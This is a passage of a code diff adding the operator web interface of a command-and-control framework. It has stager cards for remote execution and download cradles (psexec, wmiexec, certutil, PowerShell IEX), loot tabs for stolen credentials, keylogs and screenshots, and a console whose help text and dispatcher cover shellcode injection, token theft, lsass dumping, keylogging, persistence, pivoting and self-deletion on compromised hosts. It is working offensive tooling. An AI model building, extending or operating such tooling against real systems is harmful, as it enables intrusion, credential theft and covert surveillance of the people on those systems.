+          <!-- Sección 1: Upload via SMB + exec -->
+          <div class="stager-section-title">Upload via SMB + Ejecución</div>
+
+          <div class="cradle-card">
+            <div class="cradle-head">
+              <span class="cradle-title">smbclient — Subir binario</span>
+              <span class="cradle-tag tag-smb">SMB</span>
+            </div>
+            <div class="cradle-body">
+              <pre class="cradle-cmd" id="cr-smb-upload"></pre>
+              <button class="cradle-copy" onclick="stagerCopy('smb-upload')">Copiar</button>
+            </div>
+          </div>
+
+          <div class="cradle-card">
+            <div class="cradle-head">
+              <span class="cradle-title">smbclient + wmiexec — Upload &amp; exec</span>
+              <span class="cradle-tag tag-wmi">WMI</span><span class="cradle-tag tag-smb" style="margin-left:3px">SMB</span>
+            </div>
+            <div class="cradle-body">
+              <pre class="cradle-cmd" id="cr-smb-wmi"></pre>
+              <button class="cradle-copy" onclick="stagerCopy('smb-wmi')">Copiar</button>
+            </div>
+          </div>
+
+          <div class="cradle-card">
+            <div class="cradle-head">
+              <span class="cradle-title">smbclient + atexec — Scheduled Task</span>
+              <span class="cradle-tag tag-smb">SMB</span>
+            </div>
+            <div class="cradle-body">
+              <pre class="cradle-cmd" id="cr-smb-atexec"></pre>
+              <button class="cradle-copy" onclick="stagerCopy('smb-atexec')">Copiar</button>
+            </div>
+          </div>
+
+          <div class="cradle-card">
+            <div class="cradle-head">
+              <span class="cradle-title">smbclient + dcomexec — DCOM/MMC</span>
+              <span class="cradle-tag tag-wmi">DCOM</span>
+            </div>
+            <div class="cradle-body">
+              <pre class="cradle-cmd" id="cr-smb-dcom"></pre>
+              <button class="cradle-copy" onclick="stagerCopy('smb-dcom')">Copiar</button>
+            </div>
+          </div>
+
+          <!-- Sección 2: All-in-one -->
+          <div class="stager-section-title">Herramientas all-in-one</div>
+
+          <div class="cradle-card">
+            <div class="cradle-head">
+              <span class="cradle-title">psexec — Upload + shell SYSTEM</span>
+              <span class="cradle-tag tag-smb">SMB</span>
+            </div>
+            <div class="cradle-body">
+              <pre class="cradle-cmd" id="cr-psexec"></pre>
+              <button class="cradle-copy" onclick="stagerCopy('psexec')">Copiar</button>
+            </div>
+          </div>
+
+          <div class="cradle-card">
+            <div class="cradle-head">
+              <span class="cradle-title">smbexec — Shell SMB remota</span>
+              <span class="cradle-tag tag-smb">SMB</span>
+            </div>
+            <div class="cradle-body">
+              <pre class="cradle-cmd" id="cr-smbexec"></pre>
+              <button class="cradle-copy" onclick="stagerCopy('smbexec')">Copiar</button>
+            </div>
+          </div>
+
+          <div class="cradle-card">
+            <div class="cradle-head">
+              <span class="cradle-title">netexec — Upload + exec</span>
+              <span class="cradle-tag tag-tool">NXE</span>
+            </div>
+            <div class="cradle-body">
+              <pre class="cradle-cmd" id="cr-nxe-upload"></pre>
+              <button class="cradle-copy" onclick="stagerCopy('nxe-upload')">Copiar</button>
+            </div>
+          </div>
+
+          <div class="cradle-card">
+            <div class="cradle-head">
+              <span class="cradle-title">evil-winrm — Sesión + upload</span>
+              <span class="cradle-tag tag-tool">WinRM</span>
+            </div>
+            <div class="cradle-body">
+              <pre class="cradle-cmd" id="cr-evilwinrm"></pre>
+              <button class="cradle-copy" onclick="stagerCopy('evilwinrm')">Copiar</button>
+            </div>
+          </div>
+
+          <!-- Sección 3: LOLBin download + exec -->
+          <div class="stager-section-title">LOLBin — Descarga desde staging + exec</div>
+
+          <div class="cradle-card">
+            <div class="cradle-head">
+              <span class="cradle-title">wmiexec + certutil</span>
+              <span class="cradle-tag tag-lol">LOLBin</span>
+            </div>
+            <div class="cradle-body">
+              <pre class="cradle-cmd" id="cr-certutil"></pre>
+              <button class="cradle-copy" onclick="stagerCopy('certutil')">Copiar</button>
+            </div>
+          </div>
+
+          <div class="cradle-card">
+            <div class="cradle-head">
+              <span class="cradle-title">wmiexec + bitsadmin</span>
+              <span class="cradle-tag tag-lol">LOLBin</span>
+            </div>
+            <div class="cradle-body">
+              <pre class="cradle-cmd" id="cr-bitsadmin"></pre>
+              <button class="cradle-copy" onclick="stagerCopy('bitsadmin')">Copiar</button>
+            </div>
+          </div>
+
+          <div class="cradle-card">
+            <div class="cradle-head">
+              <span class="cradle-title">wmiexec + PowerShell IEX <span style="font-size:9px;color:var(--text3)">(fileless)</span></span>
+              <span class="cradle-tag tag-lol">LOLBin</span>
+            </div>
+            <div class="cradle-body">
+              <pre class="cradle-cmd" id="cr-ps-iex"></pre>
+              <button class="cradle-copy" onclick="stagerCopy('ps-iex')">Copiar</button>
+            </div>
+          </div>
+
+          <div class="cradle-card">
+            <div class="cradle-head">
+              <span class="cradle-title">netexec + PowerShell IEX</span>
+              <span class="cradle-tag tag-tool">NXE</span><span class="cradle-tag tag-lol" style="margin-left:3px">LOLBin</span>
+            </div>
+            <div class="cradle-body">
+              <pre class="cradle-cmd" id="cr-nxe-iex"></pre>
+              <button class="cradle-copy" onclick="stagerCopy('nxe-iex')">Copiar</button>
+            </div>
+          </div>
+
+          <!-- Sección 4: SMB server local -->
+          <div class="stager-section-title">Servidor SMB local (sin subir archivo)</div>
+
+          <div class="cradle-card">
+            <div class="cradle-head">
+              <span class="cradle-title">impacket-smbserver + wmiexec UNC</span>
+              <span class="cradle-tag tag-smb">SMB</span>
+            </div>
+            <div class="cradle-body">
+              <pre class="cradle-cmd" id="cr-smbserver"></pre>
+              <button class="cradle-copy" onclick="stagerCopy('smbserver')">Copiar</button>
+            </div>
+          </div>
+
+        </div><!-- /stager-cradles -->
+      </div><!-- /stager-body -->
+    </div><!-- /tab-stager -->
+
+    <!-- ── Loot ── -->
+    <div class="tab-panel" id="tab-loot">
+      <div class="sub-tabs">
+        <div class="sub-tab active" onclick="showSubTab('loot','creds')">Credentials</div>
+        <div class="sub-tab" onclick="showSubTab('loot','keylog')">Keylog</div>
+        <div class="sub-tab" onclick="showSubTab('loot','screenshots')">Screenshots</div>
+        <div class="sub-tab" onclick="showSubTab('loot','downloads')">Downloads</div>
+      </div>
+      <div id="loot-panel">
+        <!-- Credentials -->
+        <div class="sub-panel active" id="sub-loot-creds">
+          <div style="display:flex;gap:8px;align-items:center;margin-bottom:10px">
+            <input class="search-box" id="cred-filter" placeholder="Filter credentials…" oninput="renderCreds()">
+            <div class="spacer"></div>
+            <button class="btn btn-primary btn-sm" onclick="openModal('modal-add-cred')">+ Add</button>
+          </div>
+          <div class="panel">
+            <table id="creds-table">
+              <thead><tr><th>Type</th><th>Domain</th><th>Username</th><th>Secret</th><th>Host</th><th>Source</th><th>Actions</th></tr></thead>
+              <tbody id="creds-tbody"></tbody>
+            </table>
+          </div>
+        </div>
+        <!-- Keylog -->
+        <div class="sub-panel" id="sub-loot-keylog">
+          <div style="display:flex;gap:8px;align-items:center;margin-bottom:10px">
+            <select id="keylog-agent" style="width:200px"><option value="">— select agent —</option></select>
+            <button class="btn btn-ghost btn-sm" onclick="dumpKeylog()">📋 Dump</button>
+          </div>
+          <div class="panel" style="padding:10px;font-family:var(--font-mono);font-size:11px;min-height:200px;white-space:pre-wrap" id="keylog-output">No keylog data. Select an agent and click Dump.</div>
+        </div>
+        <!-- Screenshots -->
+        <div class="sub-panel" id="sub-loot-screenshots">
+          <div style="display:flex;gap:8px;margin-bottom:10px">
+            <select id="ss-agent" style="width:200px"><option value="">— select agent —</option></select>
+            <button class="btn btn-ghost btn-sm" onclick="takeScreenshot()">📷 Capture</button>
+          </div>
+          <div id="ss-grid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:10px"></div>
+        </div>
+        <!-- Downloads -->
+        <div class="sub-panel" id="sub-loot-downloads">
+          <div class="panel">
+            <table id="downloads-table">
+              <thead><tr><th>Filename</th><th>Size</th><th>Date</th><th>Actions</th></tr></thead>
+              <tbody id="downloads-tbody"></tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── Reports ── -->
+    <div class="tab-panel" id="tab-reports">
+      <div class="toolbar">
+        <button class="btn btn-primary btn-sm" onclick="generateReport()">📄 Generate Report</button>
+        <button class="btn btn-ghost btn-sm" onclick="loadReportStats()">↻ Refresh</button>
+      </div>
+      <div id="reports-panel">
+        <div class="stat-grid" id="stat-grid"></div>
+        <div class="panel" style="margin-top:0">
+          <div class="panel-header"><span class="panel-title">Recent Activity</span></div>
+          <div class="panel-body"><div id="report-activity" style="padding:10px;font-size:12px;color:var(--text2)">Loading…</div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── Chat ── -->
+    <div class="tab-panel" id="tab-chat">
+      <div class="toolbar">
+        <span style="color:var(--text3);font-size:11px">Multi-operator chat</span>
+        <div class="spacer"></div>
+        <span id="operators-online" style="font-size:11px;color:var(--green)"></span>
+      </div>
+      <div id="chat-panel">
+        <div class="panel" style="flex:1;overflow:hidden;display:flex;flex-direction:column">
+          <div id="chat-messages"></div>
+        </div>
+        <div id="chat-input-row">
+          <input id="chat-input" placeholder="Message operators…" onkeydown="chatKey(event)" style="flex:1">
+          <button class="btn btn-primary btn-sm" onclick="sendChat()">Send</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── Logs ── -->
+    <div class="tab-panel" id="tab-logs">
+      <div class="toolbar">
+        <select id="log-filter" onchange="filterLogs()">
+          <option value="">All Events</option>
+          <option value="AGENT_CHECKIN">Agent Checkins</option>
+          <option value="TASK_RESULT">Task Results</option>
+          <option value="CHAT">Chat</option>
+          <option value="LOG">Server Logs</option>
+          <option value="ERROR">Errors</option>
+        </select>
+        <div class="spacer"></div>
+        <label style="font-size:11px;color:var(--text3);display:flex;align-items:center;gap:5px">
+          <input type="checkbox" id="log-autoscroll" checked> Auto-scroll
+        </label>
+        <button class="btn btn-ghost btn-sm" onclick="document.getElementById('log-list').innerHTML='';logEntries=[]">Clear</button>
+      </div>
+      <div id="logs-panel">
+        <div id="log-list"></div>
+      </div>
+    </div>
+
+  </div><!-- /content -->
+
+<!-- Toast container -->
+<div id="toast-container"></div>
+
+<!-- ── Modals ── -->
+
+<!-- Login -->
+<div class="modal-overlay open" id="modal-login">
+  <div class="modal" style="max-width:380px">
+    <div class="modal-header"><span class="modal-title">■ C2 — Connect</span></div>
+    <div class="modal-body">
+      <div class="form-row">
+        <label>Server URL</label>
+        <input id="login-url" value="" placeholder="http://127.0.0.1:8888">
+      </div>
+      <div class="form-row">
+        <label>Bearer Token</label>
+        <input id="login-token" type="password" placeholder="Paste token from server output">
+      </div>
+      <div class="form-row">
+        <label>Operator Name</label>
+        <input id="login-name" placeholder="alice" value="operator">
+      </div>
+      <p id="login-err" style="color:var(--red);font-size:11px;display:none"></p>
+    </div>
+    <div class="modal-footer">
+      <button class="btn btn-primary" onclick="doLogin()">Connect</button>
+    </div>
+  </div>
+</div>
+
+<!-- New Listener -->
+<div class="modal-overlay" id="modal-listener">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="modal-title">New Listener</span>
+      <button class="modal-close btn" onclick="closeModal('modal-listener')">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="form-row">
+        <label>Protocol</label>
+        <select id="lst-proto" onchange="listenerProtoChange()">
+          <option value="http">HTTP</option>
+          <option value="mtls">mTLS</option>
+          <option value="wstunnel">WS Tunnel</option>
+          <option value="dns">DNS</option>
+        </select>
+      </div>
+      <div class="form-row">
+        <label>Port</label>
+        <input id="lst-port" value="8080" type="number">
+      </div>
+      <div class="form-row" id="lst-domain-row" style="display:none">
+        <label>Domain (for DNS)</label>
+        <input id="lst-domain" placeholder="ns1.attacker.com">
+      </div>
+    </div>
+    <div class="modal-footer">
+      <button class="btn btn-ghost" onclick="closeModal('modal-listener')">Cancel</button>
+      <button class="btn btn-primary" onclick="startListener()">Start</button>
+    </div>
+  </div>
+</div>
+
+<!-- Add Credential -->
+<div class="modal-overlay" id="modal-add-cred">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="modal-title">Add Credential</span>
+      <button class="modal-close btn" onclick="closeModal('modal-add-cred')">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="form-row-inline">
+        <div class="form-row">
+          <label>Type</label>
+          <select id="cred-type">
+            <option value="plaintext">Plaintext</option>
+            <option value="ntlm">NTLM Hash</option>
+            <option value="kerberos">Kerberos</option>
+            <option value="certificate">Certificate</option>
+          </select>
+        </div>
+        <div class="form-row">
+          <label>Domain</label>
+          <input id="cred-domain" placeholder="CORP">
+        </div>
+      </div>
+      <div class="form-row-inline">
+        <div class="form-row">
+          <label>Username</label>
+          <input id="cred-user" placeholder="administrator">
+        </div>
+        <div class="form-row">
+          <label>Host</label>
+          <input id="cred-host" placeholder="DC01">
+        </div>
+      </div>
+      <div class="form-row">
+        <label>Secret (password / hash)</label>
+        <input id="cred-secret" placeholder="P@ssw0rd!">
+      </div>
+      <div class="form-row">
+        <label>Source</label>
+        <input id="cred-source" placeholder="mimikatz / manual">
+      </div>
+    </div>
+    <div class="modal-footer">
+      <button class="btn btn-ghost" onclick="closeModal('modal-add-cred')">Cancel</button>
+      <button class="btn btn-primary" onclick="addCred()">Add</button>
+    </div>
+  </div>
+</div>
+
+<script>
+'use strict';
+// ── State ──────────────────────────────────────────────────────────────────────
+let BASE = '';
+let TOKEN = '';
+let OPERATOR = 'operator';
+let agents = [];
+let listeners = [];
+let creds = [];
+let downloads = [];
+let logEntries = [];
+let chatMsgs = [];
+let lastChatID = 0;
+let activeAgent = null; // full agent object
+let consoleHistory = {}; // agentID -> string[]
+let consoleHistIdx = {};
+let sseSource = null;
+
+// ── Init ───────────────────────────────────────────────────────────────────────
+window.onload = () => {
+  const saved = localStorage.getItem('c2_session');
+  if (saved) {
+    try {
+      const d = JSON.parse(saved);
+      BASE = d.base || '';
+      TOKEN = d.token || '';
+      OPERATOR = d.op || 'operator';
+      document.getElementById('login-url').value = BASE;
+      document.getElementById('login-token').value = TOKEN;
+      document.getElementById('login-name').value = OPERATOR;
+      if (BASE && TOKEN) doLogin();
+    } catch(e) {}
+  }
+  stagerUpdate();
+  // Keyboard shortcuts
+  document.addEventListener('keydown', e => {
+    if (e.altKey && e.key >= '1' && e.key <= '7') {
+      const tabs = ['agents','listeners','payloads','stager','loot','reports','chat','logs'];
+      showTab(tabs[+e.key-1]);
+    }
+    if (e.ctrlKey && e.key === 'k') {
+      const ci = document.getElementById('console-input');
+      if (ci) ci.focus();
+      e.preventDefault();
+    }
+    if (e.metaKey && e.key === 'Enter') {
+      toggleConsoleMax();
+      e.preventDefault();
+    }
+  });
+};
+
+// ── Login ──────────────────────────────────────────────────────────────────────
+async function doLogin() {
+  BASE = document.getElementById('login-url').value.trim().replace(/\/+$/,'');
+  TOKEN = document.getElementById('login-token').value.trim();
+  OPERATOR = document.getElementById('login-name').value.trim() || 'operator';
+  document.getElementById('op-name').textContent = 'operator: ' + OPERATOR;
+
+  if (!BASE || !TOKEN) {
+    showLoginErr('Server URL and token are required.');
+    return;
+  }
+  try {
+    const r = await api('GET', '/gui/token');
+    if (r.ok) {
+      localStorage.setItem('c2_session', JSON.stringify({base:BASE,token:TOKEN,op:OPERATOR}));
+      closeModal('modal-login');
+      initApp();
+    } else {
+      showLoginErr('Invalid token.');
+    }
+  } catch(e) {
+    showLoginErr('Cannot connect to server: ' + e.message);
+  }
+}
+function showLoginErr(msg) {
+  const el = document.getElementById('login-err');
+  el.textContent = msg;
+  el.style.display = '';
+}
+
+// ── App Init ──────────────────────────────────────────────────────────────────
+function initApp() {
+  connectSSE();
+  refreshAgents();
+  refreshListeners();
+  loadCreds();
+  loadDownloads();
+  loadReportStats();
+  loadChat();
+  setInterval(refreshAgents, 5000);
+  setInterval(refreshListeners, 10000);
+  setInterval(loadChat, 5000);
+}
+
+// ── SSE ────────────────────────────────────────────────────────────────────────
+function connectSSE() {
+  if (sseSource) sseSource.close();
+  sseSource = new EventSource(`${BASE}/gui/events?token=${encodeURIComponent(TOKEN)}`);
+  sseSource.onopen = () => {
+    document.getElementById('conn-dot').className = 'ok';
+    document.getElementById('conn-text').textContent = 'Connected';
+  };
+  sseSource.onerror = () => {
+    document.getElementById('conn-dot').className = '';
+    document.getElementById('conn-text').textContent = 'Disconnected';
+    setTimeout(connectSSE, 3000);
+  };
+  sseSource.onmessage = e => {
+    try {
+      const ev = JSON.parse(e.data);
+      handleSSE(ev);
+    } catch(err) {}
+  };
+}
+
+function handleSSE(ev) {
+  addLog(ev);
+  if (ev.type === 'AGENT_CHECKIN') {
+    toast('🟢 ' + ev.msg, 'green');
+    refreshAgents();
+    updateBadge('agents');
+  } else if (ev.type === 'TASK_RESULT') {
+    if (activeAgent && ev.agent_id && activeAgent.id.startsWith(ev.agent_id)) {
+      pollResult(ev.task_id);
+    }
+  } else if (ev.type === 'CHAT') {
+    appendChatMsg({sender: ev.sender, message: ev.msg, ts: new Date().toISOString(), id: ev.task_id});
+    if (!isChatVisible()) updateBadge('chat');
+  }
+}
+
+// ── API ────────────────────────────────────────────────────────────────────────
+async function api(method, path, body, raw=false) {
+  const opts = {
+    method,
+    headers: {'Authorization': 'Bearer ' + TOKEN},
+  };
+  if (body instanceof FormData) {
+    opts.body = body;
+  } else if (body !== undefined) {
+    opts.headers['Content-Type'] = 'application/json';
+    opts.body = JSON.stringify(body);
+  }
+  const resp = await fetch(BASE + path, opts);
+  if (raw) return resp;
+  const json = await resp.json();
+  return json;
+}
+
+// ── Tabs ───────────────────────────────────────────────────────────────────────
+function showTab(name) {
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById('tab-'+name)?.classList.add('active');
+  document.querySelector(`[data-tab="${name}"]`)?.classList.add('active');
+  clearBadge(name);
+  if (name === 'agents') refreshAgents();
+  if (name === 'loot') { loadCreds(); loadDownloads(); }
+  if (name === 'reports') loadReportStats();
+  if (name === 'chat') { loadChat(); clearBadge('chat'); }
+}
+
+function showSubTab(group, name) {
+  document.querySelectorAll(`#tab-${group} .sub-tab`).forEach(t => t.classList.remove('active'));
+  document.querySelectorAll(`#tab-${group} .sub-panel`).forEach(p => p.classList.remove('active'));
+  event.target.classList.add('active');
+  document.getElementById(`sub-${group}-${name}`)?.classList.add('active');
+}
+
+// ── Agents ─────────────────────────────────────────────────────────────────────
+async function refreshAgents() {
+  try {
+    const r = await api('GET', '/gui/api/agents');
+    if (!r.ok) return;
+    agents = r.data || [];
+    renderAgents();
+    updateAgentSelects();
+  } catch(e) {}
+}
+
+function renderAgents() {
+  const filter = document.getElementById('agent-filter').value.toLowerCase();
+  const tbody = document.getElementById('agents-tbody');
+  const filtered = agents.filter(a =>
+    !filter || [a.hostname,a.username,a.os,a.id].some(f => f?.toLowerCase().includes(filter))
+  );
+  document.getElementById('agent-count').textContent = `${filtered.length} agent${filtered.length!==1?'s':''}`;
+
+  tbody.innerHTML = filtered.map(a => {
+    const status = agentStatus(a);
+    const sel = activeAgent?.id === a.id ? 'selected' : '';
+    return `<tr class="${sel}" onclick="selectAgent('${a.id}')" style="cursor:pointer">
+      <td onclick="event.stopPropagation()"><input type="checkbox" class="agent-chk" value="${a.id}"></td>
+      <td class="mono">${a.id.substring(0,8)}</td>
+      <td>${esc(a.hostname||'')}</td>
+      <td>${esc(a.username||'')}</td>
+      <td>${esc(a.os||'')}</td>
+      <td class="mono">${esc(a.ip||'')}</td>
+      <td class="mono">${a.pid||''}</td>
+      <td>${a.sleep_sec||60}s</td>
+      <td class="mono" style="color:var(--text3)">${relTime(a.last_seen)}</td>
+      <td><span class="dot dot-${status.color}"></span>${status.label}</td>
+      <td onclick="event.stopPropagation()">
+        <button class="btn btn-ghost btn-sm" onclick="openConsoleFor('${a.id}')">Console</button>
+        <button class="btn btn-danger btn-sm" onclick="killAgent('${a.id}')">Kill</button>
+      </td>
+    </tr>`;
+  }).join('') || `<tr><td colspan="11" style="text-align:center;color:var(--text3);padding:30px">No agents connected</td></tr>`;
+}
+
+function agentStatus(a) {
+  const now = Date.now();
+  const ls = new Date(a.last_seen).getTime();
+  const sleep = (a.sleep_sec || 60) * 1000;
+  const delta = now - ls;
+  if (delta < sleep * 2.5) return {color:'green', label:'Active'};
+  if (delta < sleep * 10) return {color:'yellow', label:'Delayed'};
+  return {color:'red', label:'Dead'};
+}
+
+function selectAgent(id) {
+  activeAgent = agents.find(a => a.id === id);
+  openConsoleFor(id);
+  document.querySelectorAll('#agents-tbody tr').forEach(tr => tr.classList.remove('selected'));
+  event?.currentTarget?.classList.add('selected');
+}
+
+function openConsoleFor(id) {
+  const a = agents.find(x => x.id === id);
+  if (!a) return;
+  activeAgent = a;
+  document.getElementById('console-pane').classList.add('open');
+  document.getElementById('console-title').textContent =
+    `${a.id.substring(0,8)} · ${a.username}@${a.hostname} (${a.os})`;
+  if (!consoleHistory[id]) consoleHistory[id] = [];
+  consoleHistIdx[id] = consoleHistory[id].length;
+  loadConsoleResults(id);
+  // Defer focus until after the browser has rendered the pane visible.
+  // Without rAF the focus() fires while display is still transitioning from
+  // none→flex, and the click event on the row can override it anyway.
+  requestAnimationFrame(() => document.getElementById('console-input').focus());
+}
+
+function closeConsole() {
+  const pane = document.getElementById('console-pane');
+  pane.classList.remove('open','maximized');
+  document.getElementById('agents-table-wrap').classList.remove('console-hidden');
+  document.getElementById('console-max-btn').textContent = '⤢';
+  activeAgent = null;
+}
+
+function toggleConsoleMax() {
+  const pane = document.getElementById('console-pane');
+  if (!pane.classList.contains('open')) return;
+  const isMax = pane.classList.toggle('maximized');
+  document.getElementById('agents-table-wrap').classList.toggle('console-hidden', isMax);
+  document.getElementById('console-max-btn').textContent = isMax ? '⤡' : '⤢';
+  if (!isMax) document.getElementById('console-input').focus();
+}
+function clearConsole() {
+  document.getElementById('console-output').innerHTML = '';
+}
+
+async function loadConsoleResults(agentID) {
+  try {
+    const r = await api('GET', `/gui/api/agents/${agentID}/results?limit=20`);
+    if (!r.ok || !r.data) return;
+    const out = document.getElementById('console-output');
+    out.innerHTML = '';
+    r.data.reverse().forEach(res => {
+      addConsoleOutput(res.output || '', res.error || '', res.created_at);
+    });
+    out.scrollTop = out.scrollHeight;
+  } catch(e) {}
+}
+
+function addConsoleOutput(output, err, ts) {
+  const out = document.getElementById('console-output');
+  const timeStr = ts ? new Date(ts).toLocaleTimeString() : new Date().toLocaleTimeString();
+  if (output) {
+    const line = document.createElement('div');
+    line.className = 'console-line';
+    line.innerHTML = `<span class="console-ts">[${timeStr}]</span><span class="console-out">${esc(output)}</span>`;
+    out.appendChild(line);
+  }
+  if (err) {
+    const line = document.createElement('div');
+    line.className = 'console-line';
+    line.innerHTML = `<span class="console-ts">[${timeStr}]</span><span class="console-err">ERR: ${esc(err)}</span>`;
+    out.appendChild(line);
+  }
+  out.scrollTop = out.scrollHeight;
+}
+
+function consoleKey(e) {
+  const input = document.getElementById('console-input');
+  const id = activeAgent?.id;
+  if (!id) return;
+  const hist = consoleHistory[id] || [];
+  if (e.key === 'Enter') {
+    const cmd = input.value.trim();
+    if (!cmd) return;
+    hist.push(cmd);
+    consoleHistory[id] = hist.slice(-100);
+    consoleHistIdx[id] = hist.length;
+    input.value = '';
+    addConsoleCommand(cmd);
+    dispatchConsoleCmd(id, cmd);
+  } else if (e.key === 'ArrowUp') {
+    let idx = consoleHistIdx[id] ?? hist.length;
+    if (idx > 0) { idx--; consoleHistIdx[id] = idx; input.value = hist[idx] || ''; }
+    e.preventDefault();
+  } else if (e.key === 'ArrowDown') {
+    let idx = consoleHistIdx[id] ?? hist.length;
+    if (idx < hist.length - 1) { idx++; consoleHistIdx[id] = idx; input.value = hist[idx] || ''; }
+    else { consoleHistIdx[id] = hist.length; input.value = ''; }
+    e.preventDefault();
+  }
+}
+
+function addConsoleCommand(cmd) {
+  const out = document.getElementById('console-output');
+  const line = document.createElement('div');
+  line.className = 'console-line';
+  line.innerHTML = `<span class="console-ts">[${new Date().toLocaleTimeString()}]</span><span class="console-prompt">»</span><span class="console-cmd"> ${esc(cmd)}</span>`;
+  out.appendChild(line);
+  out.scrollTop = out.scrollHeight;
+}
+
+const HELP_TEXT = `Available commands:
+── Filesystem ───────────────────────────────────────────────
+  shell <cmd>                    run OS command (cmd.exe /C)
+  ls [path]                      list directory
+  cd <path>                      change directory
+  pwd                            print working directory
+  cat <file>                     read file contents
+  mkdir <dir>                    create directory
+  rm <path>                      delete file or directory
+  env                            list environment variables
+  download <remote_path>         download file from agent
+  upload <server_file> <dst>     upload file to agent
+── Process / Recon ──────────────────────────────────────────
+  ps                             list processes
+  sysinfo                        hostname, user, OS, PID
+  screenshot                     take screenshot → uploads
+  sleep <sec> [jitter%]          update beacon interval
+── Injection ────────────────────────────────────────────────
+  inject <pid> <file.bin>        inject shellcode into PID
+  inject-apc <file.bin> [proc]   APC early-bird injection
+  forkrun <file.bin> [proc]      shellcode in sacrificial process
+  stage2 <file.bin>              handoff to another C2
+── Tokens ───────────────────────────────────────────────────
+  token steal <pid>              steal process token
+  token make <domain\\user> <pass>  create token
+  token drop                     revert to original token
+  token whoami                   show current token + integrity
+── Post-exploitation ────────────────────────────────────────
+  keylog start                   install WH_KEYBOARD_LL hook
+  keylog stop                    remove hook
+  keylog dump                    dump captured keystrokes
+  clip                           read clipboard (CF_UNICODETEXT)
+  minidump [pid]                 dump lsass.exe → uploads .dmp
+  port-scan <ip> <ports> [ms]    TCP connect scan from agent
+  bof <name|path> [args]         execute BOF (COFF x64)
+  persist <method> <cmd>         install persistence
+── Pivoting ─────────────────────────────────────────────────
+  socks start <port> [user:pass] start SOCKS5 proxy
+  socks stop                     stop SOCKS5 proxy
+  portfwd add [tcp|udp] <lp> <rh> <rp>  port forward
+  portfwd del <lport>            remove port forward
+  portfwd list                   list active forwards
+  rsocks start <port>            reverse SOCKS5 tunnel
+  rsocks stop                    stop reverse SOCKS5
+  link start [pipename]          start SMB named pipe pivot
+  link stop                      stop named pipe pivot
+  httpivot start [port]          HTTP reverse proxy pivot
+  httpivot stop                  stop HTTP pivot
+  winrm exec <t> <u> <p> <cmd>  execute via WinRM
+  winrm deploy <t> <u> <p> <ps> deploy PS payload via WinRM
+── Ops ──────────────────────────────────────────────────────
+  cleanup                        self-delete agent from disk
+  kill                           terminate agent process
+  back                           close this console
+  help                           show this help`;
+
+async function dispatchConsoleCmd(agentID, cmdLine) {
+  const [cmd, ...rest] = cmdLine.split(' ');
+  const args = rest.join(' ');
+
+  if (cmd === 'back') { closeConsole(); return; }
+  if (cmd === 'help') {
+    addConsoleOutput(HELP_TEXT, '', null); return;
+  }
+
+  let taskType = '', taskArgs = '', payload = '';
+
+  switch(cmd.toLowerCase()) {
+    case 'shell': taskType='SHELL'; taskArgs=args; break;
+    case 'ps':    taskType='PS'; break;
+    case 'pwd':   taskType='PWD'; break;
+    case 'ls':    taskType='LS'; taskArgs=args; break;
+    case 'cd':    taskType='CD'; taskArgs=args; break;
+    case 'cat':   taskType='CAT'; taskArgs=args; break;
+    case 'mkdir': taskType='MKDIR'; taskArgs=args; break;
+    case 'rm':    taskType='RM'; taskArgs=args; break;
+    case 'env':   taskType='ENV'; break;
+    case 'screenshot': taskType='SCREENSHOT'; break;
+    case 'cleanup':    taskType='CLEANUP'; break;
+    case 'kill':       taskType='KILL'; break;
+    case 'clip':       taskType='CLIP_GET'; break;
+    case 'sysinfo':    taskType='SYSINFO'; break;
+    case 'sleep': {
+      const parts = args.split(' ');
+      taskType='SLEEP';
+      taskArgs = JSON.stringify({sec: parseInt(parts[0])||60, jitter: parseInt(parts[1])||20});
+      break;
+    }
+    case 'socks': {
+      const [sub, ...rest2] = args.split(' ');
+      if (sub === 'start') { taskType='SOCKS_START'; taskArgs=rest2.join(' '); }
+      else { taskType='SOCKS_STOP'; }
+      break;
+    }
+    case 'portfwd': {
+      const [sub2, ...rest3] = args.split(' ');
+      if (sub2 === 'add') { taskType='PORTFWD_ADD'; taskArgs=rest3.join(' '); }
+      else if (sub2 === 'del') { taskType='PORTFWD_DEL'; taskArgs=rest3.join(' '); }
+      else { taskType='PORTFWD_LIST'; }
+      break;
+    }
+    case 'token': {
+      const [sub3, ...rest4] = args.split(' ');
+      if (sub3 === 'steal') { taskType='TOKEN_STEAL'; taskArgs=rest4[0]; }
+      else if (sub3 === 'make') { taskType='TOKEN_MAKE'; taskArgs=rest4.join(' '); }
+      else if (sub3 === 'drop') { taskType='TOKEN_DROP'; }
+      else { taskType='TOKEN_WHOAMI'; }
+      break;
+    }
+    case 'keylog': {
+      const [sub4] = args.split(' ');
+      if (sub4 === 'start') taskType='KEYLOG_START';
+      else if (sub4 === 'stop') taskType='KEYLOG_STOP';
+      else taskType='KEYLOG_DUMP';
+      break;
+    }
+    case 'persist': {
+      const parts2 = args.split(' ');
+      taskType='PERSIST';
+      taskArgs = JSON.stringify({method:parts2[0], cmd:parts2.slice(1).join(' ')});
+      break;
+    }
+    case 'download': taskType='DOWNLOAD'; taskArgs=JSON.stringify({path:args}); break;
+    case 'minidump': taskType='MINIDUMP'; taskArgs=args; break;
+    case 'port-scan': taskType='PORT_SCAN'; taskArgs=args; break;
+    case 'winrm': {
+      const parts3 = args.split(' ');
+      if (parts3[0] === 'exec' && parts3.length >= 5) {
+        taskType='WINRM_EXEC';
+        taskArgs = JSON.stringify({target:parts3[1],user:parts3[2],pass:parts3[3],cmd:parts3.slice(4).join(' ')});
+      } else if (parts3[0] === 'deploy' && parts3.length >= 5) {
+        taskType='WINRM_DEPLOY';
+        taskArgs = JSON.stringify({target:parts3[1],user:parts3[2],pass:parts3[3],payload:parts3.slice(4).join(' ')});
+      } else {
+        addConsoleOutput('usage: winrm exec <t> <u> <p> <cmd>\n       winrm deploy <t> <u> <p> <ps_payload>', '', null);
+        return;
+      }
+      break;
+    }
+    case 'forkrun': {
+      // forkrun <shellcode.bin> [process]
+      // Shellcode must be fetched by filename from the server uploads dir
+      const parts4 = args.split(' ');
